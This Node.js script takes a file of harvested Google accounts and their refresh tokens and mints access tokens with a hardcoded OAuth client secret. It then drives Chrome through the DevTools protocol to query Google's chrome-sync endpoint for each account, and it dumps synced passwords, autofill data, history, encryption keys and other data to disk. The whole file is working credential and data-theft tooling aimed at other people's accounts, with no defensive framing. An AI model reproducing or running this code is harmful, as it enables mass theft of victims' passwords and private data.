import { WebSocket } from 'ws';
import fs from 'node:fs';
import http from 'node:http';

const CID='77185425430.apps.googleusercontent.com', SEC='OTJgUOQcT7lO7GsGZq2G4IlT';
const CDP = 'http://127.0.0.1:9222';

const vint=n=>{const b=[];while(n>0x7f){b.push((n&0x7f)|0x80);n=Math.floor(n/128);}b.push(n);return b;};
const fv=(n,v)=>[...vint(n<<3),...vint(v)];
const fb=(n,buf)=>{const b=typeof buf==='string'?Buffer.from(buf,'utf8'):buf;return[...vint((n<<3)|2),...vint(b.length),...b];};
const fm=(n,inner)=>fb(n,Buffer.from(inner));

function parsePb(buf, endTag=null) {
  const out=[]; let off=0;
  while(off<buf.length) { let tag=0,s=0; while(true){const c=buf[off++];tag|=(c&0x7f)<<s;if(!(c&0x80))break;s+=7;} const fn=tag>>3,wt=tag&7;
    if(wt===4){if(endTag!==null&&tag===endTag)return{fields:out,consumed:off};throw new Error('wg'+fn);}
    if(wt===0){let v=0,s2=0;while(true){const c=buf[off++];v|=(c&0x7f)<<s2;if(!(c&0x80))break;s2+=7;}out.push([fn,wt,v]);}
    else if(wt===2){let l=0,s2=0;while(true){const c=buf[off++];l|=(c&0x7f)<<s2;if(!(c&0x80))break;s2+=7;}out.push([fn,wt,buf.subarray(off,off+l)]);off+=l;}
    else if(wt===3){const r=parsePb(buf.subarray(off),(fn<<3)|4);out.push([fn,wt,r.fields]);off+=r.consumed;}
    else throw new Error('wt'+wt);
  }
  return {fields:out,consumed:off};
}

async function mintToken(refreshToken) {
  const r=await fetch('https://oauth2.googleapis.com/token',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:new URLSearchParams({grant_type:'refresh_token',client_id:CID,client_secret:SEC,refresh_token:refreshToken,scope:'https://www.googleapis.com/auth/chromesync'})}).then(r=>r.json());
  if(r.error) throw new Error(`mint: ${r.error}`);
  return r.access_token;
}

const TYPES=[
  [32904,'Bookmarks'],[45873,'Passwords'],[31729,'Autofill'],[63951,'AutofillProfile'],
  [47745,'Nigori'],[154522,'DeviceInfo'],[963985,'History'],[150251,'HistoryDelete'],
  [37702,'Preferences'],[41210,'Themes'],[48119,'Extensions'],[88610,'SearchEngines'],
  [411028,'ReadingList'],[673225,'WebApps']
];

async function run() {
  // get new page + navigate to clients4 for same-origin
  const pageData=await new Promise((res,rej)=>{
    const req=http.request(`${CDP}/json/new?about:blank`,{method:'PUT'},r=>{let d='';r.on('data',c=>d+=c);r.on('end',()=>res(d));});
    req.on('error',rej);req.end();
  });
  const page=JSON.parse(pageData);
  const ws=new WebSocket(page.webSocketDebuggerUrl);
  await new Promise((r,rej)=>{ws.onopen=r;ws.onerror=rej;});
  let wk=0; const pend=new Map();
  ws.onmessage=ev=>{const m=JSON.parse(ev.data);if(m.id&&pend.has(m.id)){pend.get(m.id)(m);pend.delete(m.id);}};
  const send=(method,params={})=>new Promise(res=>{const id=++wk;const t=setTimeout(()=>{pend.delete(id);res({});},20000);pend.set(id,r=>{clearTimeout(t);res(r);});ws.send(JSON.stringify({id,method,params}));});

  await send('Runtime.enable');
  await send('Page.enable');
  console.log('navigating to clients4.google.com...');
  await send('Page.navigate',{url:'https://clients4.google.com'});
  await new Promise(r=>setTimeout(r,8000));

  const all=JSON.parse(fs.readFileSync('/tmp/fatetraffic_alive.json','utf8'));
  const bd=all.filter(a=>a.email&&(a.email.includes('varienlexor')||a.email.includes('benoskar')||a.email.includes('hkofficial')||a.email.includes('imnoob908')||a.email.includes('theomilan')));
  console.log(`BD accounts: ${bd.length}`);
  bd.forEach((a,i)=>console.log(`  [${i}] ${a.email}`));

  for(let i=0;i<bd.length;i++){
    const acct=bd[i];
    console.log(`\n=== [${i+1}/${bd.length}] ${acct.email} ===`);
    let at;
    try{at=await mintToken(acct.refresh_token);console.log('  minted');}catch(e){console.log(`  SKIP: ${e.message}`);continue;}

    let found=false;
    for(const [typeId,typeName] of TYPES){
      const caller=[...fv(2,1)];
      const marker=fm(3,[...fv(1,typeId),...fb(2,Buffer.alloc(0))]);
      const gu=[...fm(1,caller),...fv(2,1),marker,...fv(8,1),...fv(4,12)];
      const reqBytes=Buffer.from([...fb(1,acct.email),...fv(2,99),...fv(3,2),...fm(5,gu)]);
      const reqB64=reqBytes.toString('base64');

      const expr=`(async()=>{
        try{
          const body=Uint8Array.from(atob('${reqB64}'),c=>c.charCodeAt(0));
          const r=await fetch('/chrome-sync/command',{method:'POST',headers:{'Content-Type':'application/octet-stream','Authorization':'Bearer ${at}'},body});
          const buf=await r.arrayBuffer();
          return JSON.stringify({s:r.status,b:Array.from(new Uint8Array(buf)),l:buf.byteLength});
        }catch(e){return JSON.stringify({e:e.message});}
      })()`;

      try{
        const ev=await send('Runtime.evaluate',{expression:expr,awaitPromise:true,returnByValue:true});
        const val=ev?.result?.result?.value;
        if(!val){console.log(`  ${typeName}: no-result`);continue;}
        const parsed=JSON.parse(val);
        if(parsed.e){console.log(`  ${typeName}: err ${parsed.e}`);continue;}
        if(parsed.s!==200){console.log(`  ${typeName}: HTTP ${parsed.s} (${parsed.l}B)`);continue;}

        const raw=Buffer.from(parsed.b);
        const top=parsePb(raw).fields;
        const guBytes=top.find(f=>f[0]===2)?.[2];
        const guf=guBytes?parsePb(guBytes).fields:[];
        const entries=guf.filter(f=>f[0]===1);
        const gotKeys=guf.filter(f=>f[0]===6);
        if(entries.length>0||gotKeys.length>0){
          console.log(`  ${typeName}: ${entries.length} entries${gotKeys.length?`, ${gotKeys.length} keys`:''} (${parsed.l}B)`);
          found=true;
          fs.writeFileSync(`/tmp/sync_${typeName}_${acct.email.replace(/[^a-z0-9]/g,'_')}.bin`,raw);
        }
      }catch(e){console.log(`  ${typeName}: ex ${e.message}`);}
    }
    if(!found) console.log('  → no sync data');
  }
  ws.close();
  console.log('\nDone.');
}
run().catch(e=>{console.error(e);process.exit(1);});
